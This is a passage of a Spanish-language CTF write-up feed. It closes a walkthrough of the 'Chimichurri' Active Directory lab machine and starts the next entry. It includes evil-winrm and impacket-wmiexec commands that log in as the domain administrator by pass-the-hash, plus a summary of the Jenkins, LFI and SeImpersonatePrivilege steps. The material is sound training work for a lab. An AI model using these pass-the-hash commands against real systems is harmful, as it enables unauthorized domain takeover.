+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.179.144 <span class="nt">-u</span> <span class="s1">'Administrador'</span> <span class="nt">-H</span> <span class="s1">'hash'</span>
+</code></pre></div></div>
+
+<p>Una vez obtenemos acceso podemos visualizar las flags y dar por terminada la maquina.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/adminuser.png" alt="adminuser.png" /></p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/pwned.png" alt="pwned.png" /></p>
+
+<p>wmiexec</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-wmiexec chimichurri.thl/Administrador@192.168.179.144 <span class="nt">-shell-type</span> powershell <span class="nt">-hashes</span> :hash
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/wmiexec.png" alt="wmiexec.png" /></p>
+
+<p>De esta forma tenemos 2 opciones para ingresar a la maquina, también con el usuario que creamos podíamos solo cambiar el pass del usuario administrador para ganar acceso a la maquina.</p>
+
+<p>¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para enumerar un AD y para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!</p>]]></content><author><name>ewor01</name></author><category term="thehackerslabs" /><category term="OSCP" /><category term="Active Directory" /><category term="Fácil" /><category term="Windows" /><category term="eCPPTv3" /><category term="SMB Enumeration" /><category term="Information Leakage" /><category term="RPC Enumeration" /><category term="Ldap Enumeration" /><category term="AXFR - Domain Zone Transfer Attack" /><category term="Kerberos User Enumeration" /><category term="ASRepRoast Attack" /><category term="SMB Password Spray Attack" /><category term="Jenkins Exploitation" /><category term="Abusing WinRM" /><category term="Abusing SeImpersonatePrivilege - Juicy Potato" /><category term="DCSync Exploitation NTDS" /><category term="PassTheHash" /><summary type="html"><![CDATA[Chimichurri es una máquina Windows de Active Directory, donde encontramos un information leakage inicial en el SMB, luego aprovechamos un LFI para explotar Jenkins y obtener credenciales. Luego obtenemos acceso mediante evil-winrm. Para escalar privilegios, abusamos del privilegio SeImpersonatePrivilege, permitiendo la elevación a Admin del dominio. Además, aplicamos técnicas de enumeración específicas para Active Directory, lo que brinda una introducción práctica a técnicas de hacking y escalación de privilegios en entornos AD.]]></summary></entry><entry><title type="html">Blogger - Hack Journey</title><link href="http://localhost:4000/blogger-hackjourney/" rel="alternate" type="text/html" title="Blogger - Hack Journey" /><published>2024-10-16T00:00:00-06:00</published><updated>2024-10-16T00:00:00-06:00</updated><id>http://localhost:4000/blogger-hackjourney</id><content type="html" xml:base="http://localhost:4000/blogger-hackjourney/"><![CDATA[<p>Esta máquina es de la plataforma Hack Journey <a href="https://www.aprendehacking.com/products/hack-journey">visitar</a></p>
 
 <p>Dificultad: Fácil</p>
 
